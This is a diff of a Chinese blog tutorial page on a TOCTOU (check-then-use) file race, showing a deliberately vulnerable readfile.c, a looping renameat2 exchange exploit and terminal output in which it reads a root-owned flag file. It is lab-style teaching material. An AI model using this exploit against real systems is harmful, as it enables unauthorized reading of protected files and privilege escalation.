@@ -60,8 +60,30 @@
 <p>正是由于间接性，产生了上面我们所说的时间差。</p>
 <p>以下面的代码为例子，程序在访问某个文件之前，会检查是否存在，判断文件的权限，之后会打开文件然后执行操作。但是如果在<strong>检查之后，真正使用文件之前</strong>，攻击者使用另一个程序(并发)将文件名替换，那么程序将访问错误的文件，就有可能造成提权，脏牛漏洞差不多也是这个原理。</p>
 <p><em><strong>readfile.c</strong></em></p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span>&#123;</span><br><span class="line">    FILE  *fd;</span><br><span class="line">    <span class="keyword">char</span> str[<span class="number">20</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">stat_data</span>;</span></span><br><span class="line">    <span class="keyword">if</span> (stat(argv[<span class="number">1</span>],&amp;stat_data)&lt;<span class="number">0</span>) &#123;           <span class="comment">//获取文件信息</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;获取失败.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (stat_data.st_uid==<span class="number">0</span>) &#123;                  <span class="comment">//验证权限</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;无权限\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">        fd=fopen(argv[<span class="number">1</span>],<span class="string">&quot;r&quot;</span>);                  <span class="comment">//操作文件</span></span><br><span class="line">        <span class="keyword">while</span> (fgets(str,<span class="number">20</span>,fd)!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,str);</span><br><span class="line">        &#125;</span><br><span class="line">        fclose(fd);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="C">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;sys/stat.h&gt;
 
+int main(int argc,char *argv[])&#123;
+    FILE  *fd;
+    char str[20];
+    struct stat stat_data;
+    if (stat(argv[1],&amp;stat_data)&lt;0) &#123;           //获取文件信息
+        printf(&quot;获取失败.\n&quot;);
+    &#125;
+
+    if (stat_data.st_uid==0) &#123;                  //验证权限
+        printf(&quot;无权限\n&quot;);
+        exit(1);
+    &#125;
+        fd=fopen(argv[1],&quot;r&quot;);                  //操作文件
+        while (fgets(str,20,fd)!=NULL)&#123;
+            printf(&quot;%s&quot;,str);
+        &#125;
+        fclose(fd);
+    return 0;
+&#125;
+</code></pre>
 <p>这里用的是<code>stat</code>函数，通过文件名去获取文件的<code>stat</code>结构，然后再判断文件的所有者，如果所有者不是<code>root</code>的话就打开它，这里从获取文件<code>stat</code>到读取并不是一步就能完成的，这两个操作有一定的时间差。</p>
 <p>现在/tmp目录下存在三个文件  </p>
 <ul>
@@ -69,23 +91,82 @@
 <li><strong>flag</strong>      软连接</li>
 <li><strong>readfile</strong>  可执行文件</li>
 </ul>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/tmp<span class="comment"># ls -li user.tmp flag readfile</span></span><br><span class="line">2228722 lrwxrwxrwx 1 user user    19 4月  10 09:47 flag -&gt; /RaceCondition/flag</span><br><span class="line">2228723 -rwxr-xr-x 1 root root 16976 4月  12 14:54 readfile</span><br><span class="line">2228721 -rw-r--r-- 1 user user     0 4月  10 09:39 user.tmp</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/RaceCondition<span class="comment"># ls -li flag</span></span><br><span class="line">4194310 -rw-r--r-- 1 root root 12 4月   9 11:34 flag</span><br></pre></td></tr></table></figure>
-
+<pre><code class="sh">root@kali:/tmp# ls -li user.tmp flag readfile
+2228722 lrwxrwxrwx 1 user user    19 4月  10 09:47 flag -&gt; /RaceCondition/flag
+2228723 -rwxr-xr-x 1 root root 16976 4月  12 14:54 readfile
+2228721 -rw-r--r-- 1 user user     0 4月  10 09:39 user.tmp
+</code></pre>
+<pre><code class="sh">root@kali:/RaceCondition# ls -li flag
+4194310 -rw-r--r-- 1 root root 12 4月   9 11:34 flag
+</code></pre>
 <p>假设现在传入的是<code>/tmp/user.tmp</code>文件<code>（st_uid=1001）</code>，它的所有者是 <code>user(uid=1001)</code>，在执行完 <code>stat(argv[1], &amp;stat_data)</code> 之后的那一个瞬间，我用另一个程序(并发)把 <code>/tmp/flag</code> （ <code>/flag</code> 的软链接 <code>st_uid=1001</code>） 重命名为 <code>/tmp/user.tmp</code> 这样的话，在 <code>if</code> 的检测中检查的是原本的那个 <code>user.tmp</code> 文件的 <code>st_uid</code>，而走到 <code>fopen</code> 的时候 <code>argv[1]</code> 虽然也是 <code>/tmp/user.tmp</code> 但是打开的却是原本的 <code>/tmp/flag</code> 文件，而这个文件是 <code>/flag</code> 的软链接，这样我们就能读出 <code>/flag</code> 的内容</p>
 <p>这个需要快速操作，才能通过<code>readfile</code>这个程序读取到 <code>/RaceCondition/flag</code> （因为我们是普通用户不能直接读取 <code>/RaceCondition/flag</code> 文件)</p>
 <p><em><strong>exp</strong></em></p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/fs.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// source https://github.com/sroettger/35c3ctf_chals/blob/master/logrotate/exploit/rename.c</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    syscall(SYS_renameat2, AT_FDCWD, argv[<span class="number">1</span>], AT_FDCWD, argv[<span class="number">2</span>], RENAME_EXCHANGE);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="C">#define _GNU_SOURCE
+#include &lt;stdio.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;sys/syscall.h&gt;
+#include &lt;linux/fs.h&gt;
+
+// source https://github.com/sroettger/35c3ctf_chals/blob/master/logrotate/exploit/rename.c
+int main(int argc, char *argv[]) &#123;
+  while (1) &#123;
+    syscall(SYS_renameat2, AT_FDCWD, argv[1], AT_FDCWD, argv[2], RENAME_EXCHANGE);
+  &#125;
+  return 0;
+&#125;
+</code></pre>
 <p>这个程序实现交换文件名的功能</p>
-<h4 id="5、演示"><a href="#5、演示" class="headerlink" title="5、演示"></a>5、演示</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/RaceCondition<span class="comment"># ./exp /tmp/user.tmp /tmp/flag</span></span><br></pre></td></tr></table></figure>
-
+<h4 id="5、演示"><a href="#5、演示" class="headerlink" title="5、演示"></a>5、演示</h4><pre><code class="sh">root@kali:/RaceCondition# ./exp /tmp/user.tmp /tmp/flag
+</code></pre>
 <p><strong>执行exp后两个文件的名字一直在交换</strong></p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/tmp<span class="comment"># ls -li user.tmp flag</span></span><br><span class="line">2228722 lrwxrwxrwx 1 user user 19 4月  10 09:47 flag -&gt; /RaceCondition/flag</span><br><span class="line">2228721 -rw-r--r-- 1 user user  0 4月  10 09:39 user.tmp</span><br><span class="line"></span><br><span class="line">root@kali:/tmp<span class="comment"># ls -li user.tmp flag</span></span><br><span class="line">ls: 无法读取符号链接<span class="string">&#x27;user.tmp&#x27;</span>: 无效的参数</span><br><span class="line">ls: 无法读取符号链接<span class="string">&#x27;flag&#x27;</span>: 无效的参数</span><br><span class="line">2228722 lrwxrwxrwx 1 user user 19 4月  10 09:47 flag</span><br><span class="line">2228722 lrwxrwxrwx 1 user user 19 4月  10 09:47 user.tmp</span><br><span class="line"></span><br><span class="line">root@kali:/tmp<span class="comment"># ls -li user.tmp flag</span></span><br><span class="line">2228722 lrwxrwxrwx 1 user user 19 4月  10 09:47 flag -&gt; /RaceCondition/flag</span><br><span class="line">2228722 lrwxrwxrwx 1 user user 19 4月  10 09:47 user.tmp -&gt; /RaceCondition/flag</span><br><span class="line"></span><br><span class="line">root@kali:/tmp<span class="comment"># ls -li user.tmp flag</span></span><br><span class="line">ls: 无法读取符号链接<span class="string">&#x27;flag&#x27;</span>: 无效的参数</span><br><span class="line">2228722 lrwxrwxrwx 1 user user 19 4月  10 09:47 flag</span><br><span class="line">2228721 -rw-r--r-- 1 user user  0 4月  10 09:39 user.tmp</span><br><span class="line"></span><br><span class="line">root@kali:/tmp<span class="comment"># ls -li user.tmp flag</span></span><br><span class="line">ls: flag: 权限不够</span><br><span class="line">2228721 -rw-r--r-- 1 user user  0 4月  10 09:39 flag</span><br><span class="line">2228722 lrwxrwxrwx 1 user user 19 4月  10 09:47 user.tmp -&gt; /RaceCondition/flag</span><br><span class="line"></span><br><span class="line">root@kali:/tmp<span class="comment"># ls -li user.tmp flag</span></span><br><span class="line">ls: 无法读取符号链接<span class="string">&#x27;flag&#x27;</span>: 无效的参数</span><br><span class="line">2228722 lrwxrwxrwx 1 user user 19 4月  10 09:47 flag</span><br><span class="line">2228722 lrwxrwxrwx 1 user user 19 4月  10 09:47 user.tmp -&gt; /RaceCondition/flag</span><br><span class="line"></span><br><span class="line">root@kali:/tmp<span class="comment"># ls -li user.tmp flag</span></span><br><span class="line">ls: flag: 权限不够</span><br><span class="line">2228721 -rw-r--r-- 1 user user 0 4月  10 09:39 flag</span><br><span class="line">2228721 -rw-r--r-- 1 user user 0 4月  10 09:39 user.tmp</span><br></pre></td></tr></table></figure>
+<pre><code class="sh">root@kali:/tmp# ls -li user.tmp flag
+2228722 lrwxrwxrwx 1 user user 19 4月  10 09:47 flag -&gt; /RaceCondition/flag
+2228721 -rw-r--r-- 1 user user  0 4月  10 09:39 user.tmp
 
+root@kali:/tmp# ls -li user.tmp flag
+ls: 无法读取符号链接&#39;user.tmp&#39;: 无效的参数
+ls: 无法读取符号链接&#39;flag&#39;: 无效的参数
+2228722 lrwxrwxrwx 1 user user 19 4月  10 09:47 flag
+2228722 lrwxrwxrwx 1 user user 19 4月  10 09:47 user.tmp
+
+root@kali:/tmp# ls -li user.tmp flag
+2228722 lrwxrwxrwx 1 user user 19 4月  10 09:47 flag -&gt; /RaceCondition/flag
+2228722 lrwxrwxrwx 1 user user 19 4月  10 09:47 user.tmp -&gt; /RaceCondition/flag
+
+root@kali:/tmp# ls -li user.tmp flag
+ls: 无法读取符号链接&#39;flag&#39;: 无效的参数
+2228722 lrwxrwxrwx 1 user user 19 4月  10 09:47 flag
+2228721 -rw-r--r-- 1 user user  0 4月  10 09:39 user.tmp
+
+root@kali:/tmp# ls -li user.tmp flag
+ls: flag: 权限不够
+2228721 -rw-r--r-- 1 user user  0 4月  10 09:39 flag
+2228722 lrwxrwxrwx 1 user user 19 4月  10 09:47 user.tmp -&gt; /RaceCondition/flag
+
+root@kali:/tmp# ls -li user.tmp flag
+ls: 无法读取符号链接&#39;flag&#39;: 无效的参数
+2228722 lrwxrwxrwx 1 user user 19 4月  10 09:47 flag
+2228722 lrwxrwxrwx 1 user user 19 4月  10 09:47 user.tmp -&gt; /RaceCondition/flag
+
+root@kali:/tmp# ls -li user.tmp flag
+ls: flag: 权限不够
+2228721 -rw-r--r-- 1 user user 0 4月  10 09:39 flag
+2228721 -rw-r--r-- 1 user user 0 4月  10 09:39 user.tmp
+</code></pre>
 <p>在文件状态一直在改变的瞬间执行<code>readfile</code>程序去读取<code>flag</code></p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ./readfile /tmp/flag</span></span><br><span class="line">无权限</span><br><span class="line"><span class="meta">$</span><span class="bash"> ./readfile /tmp/flag</span></span><br><span class="line">无权限</span><br><span class="line"><span class="meta">$</span><span class="bash"> ./readfile /tmp/flag</span></span><br><span class="line">无权限</span><br><span class="line"><span class="meta">$</span><span class="bash"> ./readfile /tmp/flag</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ./readfile /tmp/flag</span></span><br><span class="line">flag&#123;66666&#125;</span><br></pre></td></tr></table></figure>
-
+<pre><code class="shell">$ ./readfile /tmp/flag
+无权限
+$ ./readfile /tmp/flag
+无权限
+$ ./readfile /tmp/flag
+无权限
+$ ./readfile /tmp/flag
+$ ./readfile /tmp/flag
+flag&#123;66666&#125;
+</code></pre>
 <p>第5次执行的时候成功读取root用户文件内容</p>
 <p>参考文章：</p>
 <p><a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/race-condition/introduction/#cwe-363-race-condition-enabling-link-following">https://ctf-wiki.org/pwn/linux/race-condition/introduction/#cwe-363-race-condition-enabling-link-following</a></p>
